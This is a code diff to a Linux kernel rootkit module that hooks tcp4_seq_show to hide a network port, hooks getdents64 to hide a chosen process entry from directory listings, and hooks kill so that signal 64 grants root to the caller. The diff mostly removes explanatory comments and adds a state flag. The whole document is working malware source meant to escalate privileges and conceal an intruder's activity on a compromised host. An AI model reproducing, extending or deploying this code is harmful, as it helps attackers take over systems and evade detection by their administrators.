@@ -17,13 +17,13 @@ MODULE_VERSION("0.01");
 
 
 static short hidden = 1;
+static short mkdir_state = 1;
 char hide_pid[NAME_MAX];
 static short hide_port = 8080;
 
 
 static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
 
-/* This is our hook function for tcp4_seq_show */
 static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
 {
     struct inet_sock *is;
@@ -43,13 +43,6 @@ static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
 	return ret;
 }
 
-//struct new_utsname *uname = utsname();
-//sscanf(uname->release, "%*[^0-9]%d.%*d", &version);
-
-//#if (version >= 22)
-//#define verison_release 1
-//#endif
-
 
 #if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
 #define PTREGS_SYSCALL_STUBS 1
@@ -67,7 +60,6 @@ asmlinkage int hook_getdents64(const struct pt_regs *regs)
 {
     struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
 
-    /* Declare the previous_dir struct for book-keeping */
     struct linux_dirent64 *previous_dir, *current_dir, *dirent_ker = NULL;
     unsigned long offset = 0;
 
@@ -89,24 +81,16 @@ asmlinkage int hook_getdents64(const struct pt_regs *regs)
         if ( (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0)
         && (strncmp(hide_pid, "", NAME_MAX) != 0) )
         {
-            /* Check for the special case when we need to hide the first entry */
             if( current_dir == dirent_ker )
             {
-                /* Decrement ret and shift all the structs up in memory */
                 ret -= current_dir->d_reclen;
                 memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                 continue;
             }
-            /* Hide the secret entry by incrementing d_reclen of previous_dir by
-             * that of the entry we want to hide - effectively "swallowing" it
-             */
             previous_dir->d_reclen += current_dir->d_reclen;
         }  
         else
         {
-            /* Set previous_dir to current_dir before looping where current_dir
-             * gets incremented to the next entry
-             */
             previous_dir = current_dir;
         }
 
@@ -261,7 +245,6 @@ static asmlinkage long (*orig_kill)(pid_t pid, int sig);
 
 asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count)
 {
-    /* Declare the previous_dir struct for book-keeping */
     struct linux_dirent64 *previous_dir, *current_dir, *dirent_ker = NULL;
     unsigned long offset = 0;
 
@@ -283,24 +266,16 @@ asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirent, u
         if ( (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0)
         && (strncmp(hide_pid, "", NAME_MAX) != 0) )
         {
-            /* Check for the special case when we need to hide the first entry */
             if( current_dir == dirent_ker )
             {
-                /* Decrement ret and shift all the structs up in memory */
                 ret -= current_dir->d_reclen;
                 memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                 continue;
             }
-            /* Hide the secret entry by incrementing d_reclen of previous_dir by
-             * that of the entry we want to hide - effectively "swallowing" it
-             */
             previous_dir->d_reclen += current_dir->d_reclen;
         }
         else
         {
-            /* Set previous_dir to current_dir before looping where current_dir
-             * gets incremented to the next entry
-             */
             previous_dir = current_dir;
         }
 
@@ -391,7 +366,7 @@ asmlinkage int hook_kill(pid_t pid, int sig)
     void showme(void);
     void hideme(void);
 
-    if (sig == 64)
+    else if (sig == 64)
     {
         printk(KERN_INFO "rootkit: giving root...\n");
         set_root();
